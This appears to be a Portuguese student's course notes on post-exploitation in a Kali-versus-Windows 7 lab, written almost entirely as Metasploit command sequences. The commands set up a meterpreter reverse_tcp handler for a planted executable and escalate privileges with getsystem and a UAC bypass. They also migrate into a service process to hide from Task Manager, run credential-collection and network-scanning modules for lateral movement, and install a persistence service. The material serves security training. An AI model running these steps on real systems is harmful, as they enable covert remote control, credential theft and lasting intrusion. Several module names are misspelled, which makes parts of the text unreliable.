# Pos Exploração 
Last Update: 06/10/2025

Desafio Adicional:https://github.com/cassiano-dio/cibersecurity-desafio-ransomware

passo a Psso DIO
⭕ https://www.youtube.com/watch?v=icXw-N1HhmY&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

# Inicio
  A pós exploração é o momento apos ter conseguido com sucesso entrar atravez do exploit, onde começarmços a tentar elevar nossos privilegios, encontrar Informações e manter nossa conexão

  ### Escalonamento de Privilegios
Uma vez dentro do sistema usando algum usuario, tentamos cosseguir permições ou informações de usuarios com permições superiores.

• SQL Infejtion
• Manipulação de dados
• Exploitar construções fracas

# Pratica - Kali > Windows 7 
Aqui seguimos com a aula de [DIO - Tecnicas de exploração

⏩ Vamos seguir no Kali, usando o Metasploit

▶️ use mult/handler

▶️set payload windows/materpreter/reverse_tcp

((Setar o local host))
▶️ set lhost 192.168.56.103
((Quem vai controlar o servidro))
▶️Set lport 4444
▶️run

‼️ Nesse momento, temos um exe. envenenado na maquina alvo, quando ele for exucutado pelo nosso alvo uma conexação sera criada. enviando para nosso host atravez de uma porta determinada na construção do viruz pelo Meterpreter

# CONEXÂO ESTABELECIDA- POS-OPERAÇÂo

## Coletando informações

✒️Informações do sistema, windows, para podermos aproveitas outras vunerabilidades
▶️sysinfo

✒️Nome do usuario
▶️ getuid

✒️Para ganhar acesso de adm elevado.
▶️getsystem

---

‼️ getsystem é um comando do Meterpreter que tenta elevar sua sessão para a conta mais poderosa do Windows: NT AUTHORITY\SYSTEM. Ele é um comando naivo que automatiza
O Meterpreter tenta três técnicas principais, automaticamente, até uma funcionar:

🧠🔌 Named Pipe Impersonation (em memória) — cria um named pipe e faz um processo do sistema (ex.: cmd.exe rodando como SYSTEM via um serviço) conectar nele; o Meterpreter então impersona (usa) o token SYSTEM. 🕹️

💾➡️🧩 Named Pipe Impersonation (dropper → DLL em disco + rundll32) — parecido com o anterior, mas o Meterpreter escreve uma DLL no disco e usa rundll32 para executá-la como SYSTEM, que se conecta de volta ao pipe. ⚠️ (mais "barulhento" — deixa rastro no disco)

🔁Token Duplication (token stealing) — se o processo atual tem SeDebugPrivilege, o Meterpreter varre processos/serviços procurando um token SYSTEM e duplica/impersona esse token pra subir privilégios. 🕵️

---

## Mantendo conexão
✒️ Para ganhar o nome do processo dentro da maquina alvo.! Se a maquina for reiniciada, no momento atual nassa conexãocai e só retorna se executar o arquivo novamente, o que vamos contronar.
▶️ getpid

✒️ Usaremos outro comando Metaploit: migrate, que vai mudar nosso processo para um PID de um serviço que sempre esta ativo, Processo Id.
▶️ migrate 1280

👁️ O alvo, vizualizando pelo Task Manager, o nosso processo ja desapareceu.

## vamos atraz dos privilegios

⭕https://www.youtube.com/watch?v=E1E7URK9vhg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE


✒️ Vamos abrir o shell para explorar, o Alvo pode ver que esses processos estão sendo abertos em segundo plano pelo task manager.
▶️ shell

✒️ Vamos trabalhar com a UAC, mecanismo do windows de controle de acesso. 
▶️

✒️ O Metaploit é incrivel, ele tem uma galeria de exploits para serem usados, basta procurarcom o comando ▶️ sear (Alvo), no caso vamos usar
▶️ sear UAC
e encontrar nossa forma de aumentar o privilegio

vamos usar o 
▶️ use exploit/windows/local/bypassuac

▶️ show options
Precisamos definit -
Sessão:

▶️show target
> aparece 2 arquiteturas, e podemos escolher como temos informações
▶️ set target 0
▶️ set payload windows/meterpreter/reverse_tcp
▶️ set lhost 192.0.0.0
▶️ set lport 2022 
▶️ set session 1
▶️ exploit

Aqui é para conseguir  ter escalado

Aqui vamos ter 2 sessões de conexão uma para o backdor, que nos deixou entrar, e outra que vai nos permitir elevar o privilegio

Cofrme com
▶️getuid
▶️getsystem
▶️get

acionas o Shell para atacar

▶️shell
▶️whoami
▶️whoami /priv
nos conta o que temos privilegio para fazer


## Modulos de Pos exploração

Atacando a maquina

⭕ https://www.youtube.com/watch?v=DmparmUfiOY

Dentro da nossa sessão do Meterpreter
▶️ session 1
    Entrando na sessão
▶️ ps
    Vai nos revelar os processos em um a


>>> Para verificar se é ma maquina virtual
▶️ use post/windows/gather/checkvm
▶️ set session 1
▶️ run

>>>> Aqui vamos identificar as pastas compartilhadas dentro do ssitema, podendo navegar horizontalmente na rede para dentro de outros pc
▶️use post/windows/gather/enum_shares
▶️ set session 1
▶️ exploit

>>> indo atraz de aplicações
▶️ usee post/windows/gather/enum_/_applications
▶️ set session 1
▶️ run

>>>> dumplinks, vamos vasculhar tudo que foi acessado atraz de coisas em aberto
▶️ use post/windows/gather/dumplinks
▶️set session 1
▶️ run

>> Vamos coletar credenciais.

▶️use post/windowns/gather/credentials/credential_collector
▶️ show options   
▶️ set session 1
▶️ run
! Pode dar erro por conta da migração do PID

>>> Esse bloco aqui vai procurar ips na rede, ele demora, outras maquinas para expandir horizontalmente.
traz Up, Mac e systemas Op
▶️use post/windows/gather/arp_scaner
▶️set session 1
▶️ run
? ▶️ show options
? precisa de um Range ou CIDR

▶️ set RHOST 192.0.0.0/24

### Local exploit sugestion
▶️use post/mult/recon/loval_exploit_suggester
▶️set session 1
▶️ show options
▶️ set SHOWDESCRITION true
(( Essa parte aqui vai tentar achar outros exploits para usarmos))
▶️ run


## Vamos falar de Scripts

dentro do kali direto, vamos fazer um script para termos comandos de conexão
---------
Arquivo de comandos, Rc de Run comands, criando o arquivo meterpreter.rc
 
▶️ nano meterpreter.rc

Aqui abre nosso script vamos montar eles

▶️use exploit/multi/handlder
▶️ set payload windows/meterpreter/reverse_tcp
▶️set lhost 192.168.56.103
▶️set lport 444
▶️ exploit -z   ( Isso aqui joga para backgroud a sessão)
-----------

### Vamos rodar nosso script
▶️ msfconsole -r meterpreter.rc

Dentro

# Persistencia de sessão 

⭕ https://www.youtube.com/embed/ycl-EpSsi4c?controls=0&disablekb=1&enablejsapi=1&fs=0&iv_load_policy=3&modestbranding=1&showinfo=0&rel=0&html5=1&cc_load_policy=0&origin=https%3A%2F%2Fweb.dio.me&widgetid=1&forigin=https%3A%2F%2Fweb.dio.me%2Ftrack%2Fsantander-ciberseguranca-2025%2Fcourse%2Fpos-exploracao%2Flearning%2F6a4648b0-0d1b-4b66-9c91-24e8c5d85f81%3Fautoplay%3D1&aoriginsup=1&vf=6

## Como manter uma conexão caso a maquina seja reinicia, ou perca conexão

Até agr o usuario precisa reclicar no nosso executavael

vamos configurar um Script persistente

Onde vamos usar o meterpreter e o meterploit 

Vamos de Kali, e reconectar no nosso alvo para garantir

### Iniciando a sessão Zero

multhander

▶️ use exploit/multi/handler
▶️set payload windows/meterpreter/reverse_tcp
▶️ set lhost 192.168.0.0
▶️ set Lport 4444
▶️ show Options
▶️ exploit

Meterpreter iniciado
▶️backgoround

### Modulo de persistencia

Nosso exploid de conexão persistente, ele cria um executavel dentro da pasta de arquivos temporarios, assim ele não é eleiminado quando erinicamos.
▶️ use exploit/windows/local/persistencie_service

▶️ show options  (ver as configurações e configurar a sssions)
▶️ set session 1
▶️ set lhost 192.168.0.0
▶️ set lport 2022
▶️ exploit

Erro ! Precisamos escalar o privilegio, o professor trolou, precisa fazer o que fizemos no resto dos MODULOS AAAAAAAAAAAAAAAAAAAAAA

## Exploit de persistencia

▶️ use exploit/windows/local/persistence_service
▶️ session
▶️ set session XX
▶️ Ser lhost 192.168.0.0
▶️ set lport 2022
▶️ exploit


[[ Dentro ]]

Aqui iniciamos nossa sessão do meterpreter dentro da vitima.
vamos encontrar ele dentro dos dados temporarios, precisa ser adm para poder ver, e esse car é mega escondido

Para esse monstro estar funcionando o nosso session em kali deve ta On

para se reconectar

▶️ set payload windows/meterpreter/reverse_tcp
▶️ set lhost 192.0.0.
▶️ set lport 2022
▶️ show options
▶️ explot
